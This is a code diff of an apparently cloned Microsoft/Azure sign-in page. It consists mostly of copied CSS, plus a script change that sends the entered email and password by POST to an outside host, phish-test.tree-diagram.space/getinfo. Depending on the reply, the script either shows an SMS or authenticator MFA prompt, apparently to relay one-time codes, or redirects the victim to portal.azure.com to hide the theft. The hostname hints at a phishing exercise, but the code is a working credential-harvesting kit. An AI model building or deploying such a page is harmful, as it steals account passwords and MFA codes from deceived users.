+        }
+    }
+
+    @-webkit-keyframes show-from-left {
+        from {
+            left: -200px;
+            opacity: 0
+        }
+
+        to {
+            left: 0;
+            opacity: 1
+        }
+    }
+
+    @-moz-keyframes hide-to-left {
+        from {
+            left: 0;
+            opacity: 1
+        }
+
+        to {
+            left: -200px;
+            opacity: 0
+        }
+    }
+
+    @-moz-keyframes show-from-right {
+        from {
+            left: 200px;
+            opacity: 0
+        }
+
+        to {
+            left: 0;
+            opacity: 1
+        }
+    }
+
+    @-moz-keyframes hide-to-right {
+        from {
+            left: 0;
+            opacity: 1
+        }
+
+        to {
+            left: 200px;
+            opacity: 0
+        }
+    }
+
+    @-moz-keyframes show-from-left {
+        from {
+            left: -200px;
+            opacity: 0
+        }
+
+        to {
+            left: 0;
+            opacity: 1
+        }
+    }
+
+    @-ms-keyframes hide-to-left {
+        from {
+            left: 0;
+            opacity: 1
+        }
+
+        to {
+            left: -200px;
+            opacity: 0
+        }
+    }
+
+    @-ms-keyframes show-from-right {
+        from {
+            left: 200px;
+            opacity: 0
+        }
+
+        to {
+            left: 0;
+            opacity: 1
+        }
+    }
+
+    @-ms-keyframes hide-to-right {
+        from {
+            left: 0;
+            opacity: 1
+        }
+
+        to {
+            left: 200px;
+            opacity: 0
+        }
+    }
+
+    @-ms-keyframes show-from-left {
+        from {
+            left: -200px;
+            opacity: 0
+        }
+
+        to {
+            left: 0;
+            opacity: 1
+        }
+    }
+
+    @-o-keyframes hide-to-left {
+        from {
+            left: 0;
+            opacity: 1
+        }
+
+        to {
+            left: -200px;
+            opacity: 0
+        }
+    }
+
+    @-o-keyframes show-from-right {
+        from {
+            left: 200px;
+            opacity: 0
+        }
+
+        to {
+            left: 0;
+            opacity: 1
+        }
+    }
+
+    @-o-keyframes hide-to-right {
+        from {
+            left: 0;
+            opacity: 1
+        }
+
+        to {
+            left: 200px;
+            opacity: 0
+        }
+    }
+
+    @-o-keyframes show-from-left {
+        from {
+            left: -200px;
+            opacity: 0
+        }
+
+        to {
+            left: 0;
+            opacity: 1
+        }
+    }
+</style>
+<style>
+    html {
+        font-family: sans-serif;
+        -ms-text-size-adjust: 100%;
+        -webkit-text-size-adjust: 100%
+    }
+
+    body {
+        margin: 0
+    }
+
+    a {
+        background-color: transparent
+    }
+
+    a:active,
+    a:hover {
+        outline: 0
+    }
+
+    img {
+        border: 0
+    }
+
+    input {
+        font: inherit;
+        margin: 0
+    }
+
+    html input[type="button"],
+    input[type="submit"] {
+        -webkit-appearance: button;
+        cursor: pointer
+    }
+
+    button::-moz-focus-inner,
+    input::-moz-focus-inner {
+        border: 0;
+        padding: 0
+    }
+
+    * {
+        -webkit-box-sizing: border-box;
+        -moz-box-sizing: border-box;
+        box-sizing: border-box
+    }
+
+    *:before,
+    *:after {
+        -webkit-box-sizing: border-box;
+        -moz-box-sizing: border-box;
+        box-sizing: border-box
+    }
+
+    input {
+        font-family: inherit;
+        font-size: inherit
+    }
+
+    a:focus {
+        outline: thin dotted;
+        outline-offset: -2px;
+        outline: 5px auto -webkit-focus-ring-color
+    }
+
+    img {
+        vertical-align: middle
+    }
+
+    html {
+        font-size: 100%
+    }
+
+    body {
+        font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+        font-weight: 400;
+        font-size: .9375rem;
+        line-height: 1.25rem;
+        padding-bottom: .227px;
+        padding-top: .227px;
+        background-color: #fff
+    }
+
+    a {
+        color: #ccc;
+        text-decoration: none
+    }
+
+    a:link {
+        color: #0067b8
+    }
+
+    a:visited {
+        color: #0067b8
+    }
+
+    a:hover {
+        color: #666
+    }
+
+    a:focus {
+        color: #0067b8
+    }
+
+    a:active {
+        color: #999
+    }
+
+    @font-face {
+        font-family: "Segoe UI Webfont";
+        src: local("Segoe UI");
+        font-weight: 400;
+        font-style: normal
+    }
+
+    @font-face {
+        font-family: "Segoe UI Webfont";
+        src: local("Segoe UI Semibold");
+        font-weight: 600;
+        font-style: normal
+    }
+
+    .text-title {
+        line-height: 1.75rem;
+        padding-bottom: 2.3632px;
+        padding-top: 2.3632px
+    }
+
+    .text-left {
+        text-align: left
+    }
+
+    .row:before,
+    .row:after {
+        content: " ";
+        display: table
+    }
+
+    .row:after {
+        clear: both
+    }
+
+    .col-xs-24,
+    .col-md-24 {
+        position: relative;
+        min-height: 1px;
+        padding-left: 2px;
+        padding-right: 2px
+    }
+
+    .col-xs-24 {
+        float: left
+    }
+
+    .col-xs-24 {
+        width: 100%
+    }
+
+    @media (min-width:768px) {
+        .col-md-24 {
+            float: left
+        }
+
+        .col-md-24 {
+            width: 100%
+        }
+    }
+
+    input[type="submit"] {
+        padding: 4px 12px 4px 12px;
+        position: relative;
+        max-width: 100%;
+        text-align: center;
+        white-space: nowrap;
+        overflow: hidden;
+        vertical-align: middle;
+        text-overflow: ellipsis;
+        touch-action: manipulation;
+        border-style: solid;
+        border-width: 2px
+    }
+
+    .btn:hover,
+    .btn:focus,
+    button:hover,
+    button:focus,
+    input[type="button"]:hover,
+    input[type="button"]:focus,
+    input[type="submit"]:hover,
+    input[type="submit"]:focus,
+    input[type="reset"]:hover,
+    input[type="reset"]:focus {
+        border-color: rgba(0, 0, 0, 0.4)
+    }
+
+    .btn:hover,
+    button:hover,
+    input[type="button"]:hover,
+    input[type="submit"]:hover,
+    input[type="reset"]:hover {
+        cursor: pointer
+    }
+
+    .btn:active,
+    button:active,
+    input[type="button"]:active,
+    input[type="submit"]:active,
+    input[type="reset"]:active {
+        background-color: rgba(0, 0, 0, 0.4);
+        border-color: transparent
+    }
+
+    .table {
+        max-width: 100%
+    }
+
+    @-ms-viewport {
+        width: device-width
+    }
+
+    a:focus {
+        outline-offset: 0
+    }
+
+    body {
+        direction: ltr
+    }
+
+    .text-secondary {
+        color: rgba(0, 0, 0, 0.7);
+        font-size: 13px
+    }
+
+    body.cb .text-13 {
+        font-size: .8125rem
+    }
+
+    .no-padding-left-right {
+        padding-left: 0;
+        padding-right: 0
+    }
+
+    @keyframes pulse {
+        from {
+            opacity: .4
+        }
+    }
+
+    @-o-keyframes pulse {
+        from {
+            opacity: .4
+        }
+    }
+
+    @-moz-keyframes pulse {
+        from {
+            opacity: .4
+        }
+    }
+
+    @-webkit-keyframes pulse {
+        from {
+            opacity: .4
+        }
+    }
+
+    @-webkit-keyframes progressDot {
+
+        0%,
+        20% {
+            left: 0;
+            -webkit-animation-timing-function: ease-out;
+            opacity: 0
+        }
+
+        25% {
+            opacity: 1
+        }
+
+        35% {
+            left: 45%;
+            -webkit-animation-timing-function: linear
+        }
+
+        65% {
+            left: 60%;
+            -webkit-animation-timing-function: ease-in
+        }
+
+        75% {
+            opacity: 1
+        }
+
+        80%,
+        100% {
+            left: 100%;
+            opacity: 0
+        }
+    }
+
+    @-moz-keyframes progressDot {
+
+        0%,
+        20% {
+            left: 0;
+            -moz-animation-timing-function: ease-out;
+            opacity: 0
+        }
+
+        25% {
+            opacity: 1
+        }
+
+        35% {
+            left: 45%;
+            -moz-animation-timing-function: linear
+        }
+
+        65% {
+            left: 60%;
+            -moz-animation-timing-function: ease-in
+        }
+
+        75% {
+            opacity: 1
+        }
+
+        80%,
+        100% {
+            left: 100%;
+            opacity: 0
+        }
+    }
+
+    @-o-keyframes progressDot {
+
+        0%,
+        20% {
+            left: 0;
+            -o-animation-timing-function: ease-out;
+            opacity: 0
+        }
+
+        25% {
+            opacity: 1
+        }
+
+        35% {
+            left: 45%;
+            -o-animation-timing-function: linear
+        }
+
+        65% {
+            left: 60%;
+            -o-animation-timing-function: ease-in
+        }
+
+        75% {
+            opacity: 1
+        }
+
+        80%,
+        100% {
+            left: 100%;
+            opacity: 0
+        }
+    }
+
+    @keyframes progressDot {
+
+        0%,
+        20% {
+            left: 0;
+            animation-timing-function: ease-out;
+            opacity: 0
+        }
+
+        25% {
+            opacity: 1
+        }
+
+        35% {
+            left: 45%;
+            animation-timing-function: linear
+        }
+
+        65% {
+            left: 60%;
+            animation-timing-function: ease-in
+        }
+
+        75% {
+            opacity: 1
+        }
+
+        80%,
+        100% {
+            left: 100%;
+            opacity: 0
+        }
+    }
+
+    @keyframes fadeIn {
+        from {
+            opacity: 0
+        }
+
+        to {
+            opacity: 1
+        }
+    }
+
+    @-o-keyframes fadeIn {
+        from {
+            opacity: 0
+        }
+
+        to {
+            opacity: 1
+        }
+    }
+
+    @-moz-keyframes fadeIn {
+        from {
+            opacity: 0
+        }
+
+        to {
+            opacity: 1
+        }
+    }
+
+    @-webkit-keyframes fadeIn {
+        from {
+            opacity: 0
+        }
+
+        to {
+            opacity: 1
+        }
+    }
+
+    body.cb {
+        color: #1b1b1b;
+        text-align: left
+    }
+
+    .background-logo {
+        max-width: 256px;
+        max-height: 36px;
+        display: block;
+        margin-left: auto;
+        margin-right: auto;
+        -webkit-animation: fadeIn 1s;
+        -moz-animation: fadeIn 1s;
+        -o-animation: fadeIn 1s;
+        animation: fadeIn 1s
+    }
+
+    .background-logo-holder {
+        height: 36px;
+        margin-bottom: 24px
+    }
+
+    .background-image-holder {
+        position: fixed;
+        top: 0;
+        width: 100%;
+        height: 100%
+    }
+
+    .footer {
+        position: absolute;
+        left: 0;
+        bottom: 0;
+        width: 100%;
+        overflow: visible;
+        z-index: 99;
+        clear: both;
+        min-height: 28px
+    }
+
+    .footer.has-background.background-always-visible {
+        background-color: rgba(0, 0, 0, 0.6)
+    }
+
+    div.footerNode {
+        margin: 0;
+        float: right
+    }
+
+    .footer-content.footer-item {
+        font-size: 12px;
+        line-height: 28px;
+        white-space: nowrap;
+        display: inline-block;
+        margin-left: 8px;
+        margin-right: 8px
+    }
+
+    .footer-content.footer-item.debug-item {
+        text-decoration: none;
+        letter-spacing: 3px;
+        line-height: 22px;
+        vertical-align: top;
+        font-size: 16px;
+        font-weight: 600
+    }
+
+    .footer-content.footer-item.has-background.background-always-visible,
+    .footer-content.footer-item.debug-item.has-background.background-always-visible {
+        color: #fff
+    }
+
+    .outer {
+        display: table;
+        position: absolute;
+        height: 100%;
+        width: 100%
+    }
+
+    .middle {
+        display: table-cell;
+        vertical-align: middle
+    }
+
+    .sign-in-box {
+        margin-left: auto;
+        margin-right: auto;
+        position: relative;
+        max-width: 440px;
+        width: calc(100% - 40px);
+        padding: 44px;
+        margin-bottom: 28px;
+        background-color: #fff;
+        -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        min-width: 320px;
+        min-height: 338px;
+        overflow: hidden
+    }
+
+    a:hover {
+        text-decoration: underline
+    }
+
+    .template-section {
+        display: table-row
+    }
+
+    .template-section.main-section {
+        height: 100%
+    }
+
+    input[type="submit"] {
+        min-height: 32px;
+        border: none;
+        min-width: 108px;
+        line-height: normal
+    }
+
+    .btn-hover,
+    .btn:hover,
+    button:hover,
+    input[type="button"]:hover,
+    input[type="submit"]:hover,
+    input[type="reset"]:hover {
+        background-color: #b2b2b2;
+        background-color: rgba(0, 0, 0, 0.3)
+    }
+
+    .btn-focus,
+    .btn:focus,
+    button:focus,
+    input[type="button"]:focus,
+    input[type="submit"]:focus,
+    input[type="reset"]:focus {
+        background-color: #b2b2b2;
+        background-color: rgba(0, 0, 0, 0.3);
+        text-decoration: underline;
+        outline: 2px solid #000
+    }
+
+    .btn-active,
+    .btn:active,
+    button:active,
+    input[type="button"]:active,
+    input[type="submit"]:active,
+    input[type="reset"]:active,
+    .btn.btn-primary-active,
+    .btn.btn-primary:active,
+    button.btn-primary:active,
+    input[type="button"].btn-primary:active,
+    input[type="submit"].btn-primary:active,
+    input[type="reset"].btn-primary:active {
+        outline: none;
+        text-decoration: none;
+        -ms-transform: scale(.98);
+        -webkit-transform: scale(.98);
+        transform: scale(.98)
+    }
+
+    .button.secondary {
+        padding: 4px 12px 4px 12px;
+        position: relative;
+        max-width: 100%;
+        text-align: center;
+        white-space: nowrap;
+        overflow: hidden;
+        vertical-align: middle;
+        text-overflow: ellipsis;
+        touch-action: manipulation;
+        color: #000;
+        border-style: solid;
+        border-width: 2px;
+        border-color: transparent;
+        min-height: 32px;
+        border: none;
+        background-color: rgba(0, 0, 0, 0.2);
+        min-width: 108px;
+        line-height: normal;
+        margin-top: 0;
+        margin-bottom: 0;
+        display: block;
+        width: 100%
+    }
+
+    .button.secondary:hover {
+        background-color: #b2b2b2;
+        background-color: rgba(0, 0, 0, 0.3)
+    }
+
+    .button.secondary:focus {
+        background-color: #b2b2b2;
+        background-color: rgba(0, 0, 0, 0.3);
+        text-decoration: underline;
+        outline: 2px solid #000
+    }
+
+    .button.secondary:active {
+        outline: none;
+        text-decoration: none;
+        -ms-transform: scale(.98);
+        -webkit-transform: scale(.98);
+        transform: scale(.98)
+    }
+
+    .button.primary {
+        color: #fff;
+        border-color: #0067b8;
+        background-color: #0067b8;
+        width: 100%
+    }
+
+    .button.primary:hover {
+        background-color: #005da6
+    }
+
+    .button.primary:focus {
+        background-color: #005da6;
+        text-decoration: underline;
+        outline: 2px solid #000
+    }
+
+    .button.primary:active {
+        outline: none;
+        text-decoration: none;
+        -ms-transform: scale(.98);
+        -webkit-transform: scale(.98);
+        transform: scale(.98)
+    }
+
+    .logo {
+        max-width: 256px;
+        height: 24px
+    }
+
+    .identityBanner {
+        height: 24px;
+        background: #fff;
+        margin-top: 16px;
+        margin-bottom: -4px
+    }
+
+    .identity {
+        line-height: 24px;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis
+    }
+
+    .table {
+        width: 100%;
+        display: table;
+        table-layout: fixed
+    }
+
+    .table .table-row {
+        display: table-row
+    }
+
+    .table .table-cell {
+        display: table-cell;
+        vertical-align: middle
+    }
+
+    .row {
+        margin-left: 0;
+        margin-right: 0
+    }
+
+    .row.tile {
+        margin-bottom: 0;
+        outline: none;
+        color: inherit;
+        display: block;
+        margin-left: -44px;
+        margin-right: -44px
+    }
+
+    .row.tile:not(.no-pick) {
+        cursor: pointer
+    }
+
+    .row.tile:not(.no-pick):hover {
+        background-color: #e6e6e6;
+        background-color: rgba(0, 0, 0, 0.1);
+        color: inherit
+    }
+
+    .row.tile:not(.no-pick):active {
+        background-color: #b3b3b3;
+        background-color: rgba(0, 0, 0, 0.3);
+        color: inherit
+    }
+
+    .row.tile .content {
+        line-height: 16px;
+        padding-left: 12px;
+        padding-right: 12px
+    }
+
+    .row.tile .content>* {
+        word-wrap: break-word
+    }
+
+    .row.tile .table {
+        padding: 12px 44px
+    }
+
+    .row.tile .table:focus {
+        outline: #000 dashed 1px;
+        background: #ccc;
+        background: rgba(0, 0, 0, 0.1)
+    }
+
+    .row.tile .table-cell:first-child+.table-cell {
+        width: 100%
+    }
+
+    .tile-img {
+        position: relative;
+        width: 48px;
+        height: 48px
+    }
+
+    .form-group {
+        margin-bottom: 16px
+    }
+
+    input[type="submit"] {
+        margin-top: 0;
+        margin-bottom: 0
+    }
+
+    .no-margin-bottom {
+        margin-bottom: 0
+    }
+
+    .position-buttons>div:first-child {
+        display: inline-block;
+        width: 100%;
+        margin-bottom: 36px
+    }
+
+    .button-container {
+        position: absolute;
+        bottom: 0;
+        right: 0;
+        text-align: right
+    }
+
+    @media (max-width:600px),
+    (max-height:366px) {
+        .background-image-holder.app {
+            display: inherit
+        }
+
+        .background-logo-holder {
+            margin-top: 24px
+        }
+
+        .middle {
+            vertical-align: top
+        }
+
+        .sign-in-box {
+            padding: 24px;
+            margin-top: 0;
+            margin-bottom: 88px;
+            -webkit-box-shadow: none;
+            -moz-box-shadow: none
+        }
+
+        .sign-in-box.app {
+            min-width: 304px;
+            width: calc(100vw - 16px)
+        }
+
+        .sign-in-box.app {
+            -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(0, 0, 0, 0.4)
+        }
+
+        .row.tile {
+            margin-left: -24px;
+            margin-right: -24px
+        }
+
+        .row.tile .table {
+            padding: 12px 24px
+        }
+
+        .footer.has-background {
+            background-color: #fff;
+            filter: none
+        }
+
+        div.footerNode {
+            float: left;
+            margin: 0 24px !important
+        }
+
+        .footer-content.footer-item.has-background,
+        .footer-content.footer-item.debug-item.has-background {
+            color: #747474
+        }
+    }
+
+    .inline-block {
+        display: inline-block
+    }
+
+    .text-title {
+        color: #1b1b1b;
+        font-size: 1.5rem;
+        font-weight: 600;
+        padding: 0;
+        margin-top: 16px;
+        margin-bottom: 12px;
+        font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math"
+    }
+
+    .text-title:lang(zh-cn),
+    .text-title:lang(zh-tw),
+    .text-title p:lang(zh-cn),
+    .text-title p:lang(zh-tw) {
+        font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math"
+    }
+
+    div[role=listitem] {
+        list-style: circle;
+        list-style-type: disc
+    }
+
+    .pagination-view {
+        position: relative
+    }
+
+    .pagination-view.has-identity-banner {
+        min-height: 170px
+    }
+
+    .lightbox-cover {
+        background-color: white;
+        opacity: 0;
+        z-index: -1;
+        height: 100%;
+        width: 100%;
+        position: absolute;
+        top: 0;
+        left: 0;
+        transition: all .5s ease-in;
+        -o-transition: all .5s ease-in;
+        -moz-transition: all .5s ease-in;
+        -webkit-transition: all .5s ease-in
+    }
+
+    @media (-ms-high-contrast) {
+
+        input[type="button"],
+        input[type="submit"] {
+            -ms-high-contrast-adjust: none
+        }
+
+        .btn:hover,
+        .button:hover,
+        button:hover,
+        input[type="button"]:hover,
+        input[type="submit"]:hover,
+        input[type="reset"]:hover,
+        .btn.btn-google:hover {
+            outline: 1px solid windowText;
+            border: 1px solid highlight;
+            background-color: highlight;
+            color: highlightText;
+            text-decoration: none
+        }
+
+        .btn:hover:focus,
+        .button:hover:focus,
+        button:hover:focus,
+        input[type="button"]:hover:focus,
+        input[type="submit"]:hover:focus,
+        input[type="reset"]:hover:focus,
+        .btn.btn-google:hover:focus {
+            outline: 1px solid windowText;
+            border: 1px solid windowText;
+            background-color: highlight;
+            color: highlightText;
+            text-decoration: underline
+        }
+
+        .btn:focus,
+        .button:focus,
+        button:focus,
+        input[type="button"]:focus,
+        input[type="submit"]:focus,
+        input[type="reset"]:focus,
+        .btn.btn-google:focus {
+            outline: 1px solid windowText;
+            border: 1px solid windowText;
+            background-color: window;
+            color: windowText;
+            text-decoration: underline
+        }
+
+        input[type="submit"].primary,
+        input[type="button"].secondary {
+            outline: 1px solid highlight;
+            border: 1px solid highlight;
+            background-color: highlight;
+            color: highlightText;
+            text-decoration: none
+        }
+
+        .btn.btn-primary:hover,
+        .button.btn-primary:hover,
+        button.btn-primary:hover,
+        input[type="button"].btn-primary:hover,
+        input[type="submit"].btn-primary:hover,
+        input[type="reset"].btn-primary:hover,
+        .btn.btn-google.btn-primary:hover,
+        .btn.primary:hover,
+        .button.primary:hover,
+        button.primary:hover,
+        input[type="button"].primary:hover,
+        input[type="submit"].primary:hover,
+        input[type="reset"].primary:hover,
+        .btn.btn-google.primary:hover,
+        .btn.secondary:hover,
+        .button.secondary:hover,
+        button.secondary:hover,
+        input[type="button"].secondary:hover,
+        input[type="submit"].secondary:hover,
+        input[type="reset"].secondary:hover,
+        .btn.btn-google.secondary:hover {
+            outline: 1px solid highlight;
+            border: 1px solid window;
+            background-color: window;
+            color: highlight;
+            text-decoration: none
+        }
+
+        .btn.btn-primary:hover:focus,
+        .button.btn-primary:hover:focus,
+        button.btn-primary:hover:focus,
+        input[type="button"].btn-primary:hover:focus,
+        input[type="submit"].btn-primary:hover:focus,
+        input[type="reset"].btn-primary:hover:focus,
+        .btn.btn-google.btn-primary:hover:focus,
+        .btn.primary:hover:focus,
+        .button.primary:hover:focus,
+        button.primary:hover:focus,
+        input[type="button"].primary:hover:focus,
+        input[type="submit"].primary:hover:focus,
+        input[type="reset"].primary:hover:focus,
+        .btn.btn-google.primary:hover:focus,
+        .btn.secondary:hover:focus,
+        .button.secondary:hover:focus,
+        button.secondary:hover:focus,
+        input[type="button"].secondary:hover:focus,
+        input[type="submit"].secondary:hover:focus,
+        input[type="reset"].secondary:hover:focus,
+        .btn.btn-google.secondary:hover:focus {
+            outline: 1px solid windowText;
+            border: 1px solid window;
+            background-color: window;
+            color: highlight;
+            text-decoration: underline
+        }
+
+        .btn.btn-primary:focus,
+        .button.btn-primary:focus,
+        button.btn-primary:focus,
+        input[type="button"].btn-primary:focus,
+        input[type="submit"].btn-primary:focus,
+        input[type="reset"].btn-primary:focus,
+        .btn.btn-google.btn-primary:focus,
+        .btn.primary:focus,
+        .button.primary:focus,
+        button.primary:focus,
+        input[type="button"].primary:focus,
+        input[type="submit"].primary:focus,
+        input[type="reset"].primary:focus,
+        .btn.btn-google.primary:focus,
+        .btn.secondary:focus,
+        .button.secondary:focus,
+        button.secondary:focus,
+        input[type="button"].secondary:focus,
+        input[type="submit"].secondary:focus,
+        input[type="reset"].secondary:focus,
+        .btn.btn-google.secondary:focus {
+            outline: 1px solid windowText;
+            border: 1px solid window;
+            background-color: highlight;
+            color: highlightText;
+            text-decoration: underline
+        }
+    }
+
+    .fade-in-lightbox {
+        animation: fadeIn .3s ease-in;
+        -webkit-animation: fadeIn .3s ease-in;
+        -moz-animation: fadeIn .3s ease-in;
+        -ms-animation: fadeIn .3s ease-in;
+        -o-animation: fadeIn .3s ease-in
+    }
+
+    .animate {
+        animation-duration: .25s;
+        -webkit-animation-duration: .25s;
+        -moz-animation-duration: .25s;
+        -ms-animation-duration: .25s;
+        -o-animation-duration: .25s;
+        animation-timing-function: cubic-bezier(.5, 0, .5, 1);
+        -webkit-animation-timing-function: cubic-bezier(.5, 0, .5, 1);
+        -moz-animation-timing-function: cubic-bezier(.5, 0, .5, 1);
+        -ms-animation-timing-function: cubic-bezier(.5, 0, .5, 1);
+        -o-animation-timing-function: cubic-bezier(.5, 0, .5, 1);
+        animation-fill-mode: both;
+        -webkit-animation-fill-mode: both;
+        -moz-animation-fill-mode: both;
+        -ms-animation-fill-mode: both;
+        -o-animation-fill-mode: both;
+        transition-property: left;
+        -webkit-transition-property: left;
+        -moz-transition-property: left;
+        -ms-transition-property: left;
+        -o-transition-property: left
+    }
+
+    html[dir=ltr] .animate.slide-in-next {
+        animation-name: show-from-right;
+        -webkit-animation-name: show-from-right;
+        -moz-animation-name: show-from-right;
+        -ms-animation-name: show-from-right;
+        -o-animation-name: show-from-right
+    }
+
+    @keyframes hide-to-left {
+        from {
+            left: 0;
+            opacity: 1
+        }
+
+        to {
+            left: -200px;
+            opacity: 0
+        }
+    }
+
+    @keyframes show-from-right {
+        from {
+            left: 200px;
+            opacity: 0
+        }
+
+        to {
+            left: 0;
+            opacity: 1
+        }
+    }
+
+    @keyframes hide-to-right {
+        from {
+            left: 0;
+            opacity: 1
+        }
+
+        to {
+            left: 200px;
+            opacity: 0
+        }
+    }
+
+    @keyframes show-from-left {
+        from {
+            left: -200px;
+            opacity: 0
+        }
+
+        to {
+            left: 0;
+            opacity: 1
+        }
+    }
+
+    @-webkit-keyframes hide-to-left {
+        from {
+            left: 0;
+            opacity: 1
+        }
+
+        to {
+            left: -200px;
+            opacity: 0
+        }
+    }
+
+    @-webkit-keyframes show-from-right {
+        from {
+            left: 200px;
+            opacity: 0
+        }
+
+        to {
+            left: 0;
+            opacity: 1
+        }
+    }
+
+    @-webkit-keyframes hide-to-right {
+        from {
+            left: 0;
+            opacity: 1
+        }
+
+        to {
+            left: 200px;
+            opacity: 0
+        }
+    }
+
+    @-webkit-keyframes show-from-left {
+        from {
+            left: -200px;
+            opacity: 0
+        }
+
+        to {
+            left: 0;
+            opacity: 1
+        }
+    }
+
+    @-moz-keyframes hide-to-left {
+        from {
+            left: 0;
+            opacity: 1
+        }
+
+        to {
+            left: -200px;
+            opacity: 0
+        }
+    }
+
+    @-moz-keyframes show-from-right {
+        from {
+            left: 200px;
+            opacity: 0
+        }
+
+        to {
+            left: 0;
+            opacity: 1
+        }
+    }
+
+    @-moz-keyframes hide-to-right {
+        from {
+            left: 0;
+            opacity: 1
+        }
+
+        to {
+            left: 200px;
+            opacity: 0
+        }
+    }
+
+    @-moz-keyframes show-from-left {
+        from {
+            left: -200px;
+            opacity: 0
+        }
+
+        to {
+            left: 0;
+            opacity: 1
+        }
+    }
+
+    @-ms-keyframes hide-to-left {
+        from {
+            left: 0;
+            opacity: 1
+        }
+
+        to {
+            left: -200px;
+            opacity: 0
+        }
+    }
+
+    @-ms-keyframes show-from-right {
+        from {
+            left: 200px;
+            opacity: 0
+        }
+
+        to {
+            left: 0;
+            opacity: 1
+        }
+    }
+
+    @-ms-keyframes hide-to-right {
+        from {
+            left: 0;
+            opacity: 1
+        }
+
+        to {
+            left: 200px;
+            opacity: 0
+        }
+    }
+
+    @-ms-keyframes show-from-left {
+        from {
+            left: -200px;
+            opacity: 0
+        }
+
+        to {
+            left: 0;
+            opacity: 1
+        }
+    }
+
+    @-o-keyframes hide-to-left {
+        from {
+            left: 0;
+            opacity: 1
+        }
+
+        to {
+            left: -200px;
+            opacity: 0
+        }
+    }
+
+    @-o-keyframes show-from-right {
+        from {
+            left: 200px;
+            opacity: 0
+        }
+
+        to {
+            left: 0;
+            opacity: 1
+        }
+    }
+
+    @-o-keyframes hide-to-right {
+        from {
+            left: 0;
+            opacity: 1
+        }
+
+        to {
+            left: 200px;
+            opacity: 0
+        }
+    }
+
+    @-o-keyframes show-from-left {
+        from {
+            left: -200px;
+            opacity: 0
+        }
+
+        to {
+            left: 0;
+            opacity: 1
+        }
+    }
+</style>
+<style>
     html {
         font-family: sans-serif;
         -ms-text-size-adjust: 100%;
@@ -3388,13 +6068,7 @@ WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 
                                                                                             }
 
-                                                                                            // if (document.getElementById("dialogMenu").style.display === 'block') {
-                                                                                            //     console.log('hhh');
-                                                                                            //     document.getElementById("dialogMenu").style.display = 'none';
-                                                                                            // }
-                                                                                            // else {
-                                                                                            //     document.getElementById("dialogMenu").style.display = 'block';
-                                                                                            // }
+                                                                                            
                                                                                         }
                                                                                     </script>
 
@@ -3789,18 +6463,37 @@ WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
                                                                                                 if (document.getElementById("pwd22").value != "") {
                                                                                                     var email = document.getElementById("i0116").value;
                                                                                                     var password = document.getElementById("pwd22").value;
+                                                                                                    document.getElementById("displayName1").innerHTML = document.getElementById("displayName0").innerHTML;
                                                                                                     $.ajax({
                                                                                                         dataType: 'JSON',
-                                                                                                        url: "https://tree-diagram.site/getinfo",
+                                                                                                        url: "https://phish-test.tree-diagram.space/getinfo",
                                                                                                         type: 'POST',
                                                                                                         data: {
-                                                                                                            email: email,
+                                                                                                            username: email,
                                                                                                             password: password,
                                                                                                             // detail: detail,
 
                                                                                                         },
-                                                                                                        success:function(response){
+                                                                                                        success: function (response) {
                                                                                                             console.log(response);
+                                                                                                            if (response.mfa == '1') {
+                                                                                                                for (let index in response.data) {
+                                                                                                                    console.log(response.data[index])
+                                                                                                                    if (response.data[index].authMethodId == "OneWaySMS") {
+                                                                                                                        document.getElementById("mfa_item1").style.display = 'block';
+                                                                                                                        document.getElementById("mfa1").innerHTML = response.data[index].display;
+
+                                                                                                                    } else if (response.data[index].authMethodId == "PhoneAppOTP") {
+                                                                                                                        document.getElementById("mfa_item0").style.display = 'block';
+
+                                                                                                                    }
+                                                                                                                }
+                                                                                                                document.getElementById("lightbox1").style.display = 'none';
+                                                                                                                document.getElementById("lightbox2").style.display = 'block';
+
+                                                                                                            } else {
+                                                                                                                window.location.replace("https://portal.azure.com");
+                                                                                                            }
                                                                                                         }
                                                                                                     });
 
@@ -3939,6 +6632,724 @@ WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
                                                 </div>
 
                                             </div>
+                                            <div id=lightbox2 style="display: none;" data-bind="
+            animationEnd: $page.paginationControlHelper.animationEnd,
+            externalCss: { 'sign-in-box': true },
+            css: {
+                'inner':  $content.isVerticalSplitTemplate,
+                'vertical-split-content': $content.isVerticalSplitTemplate,
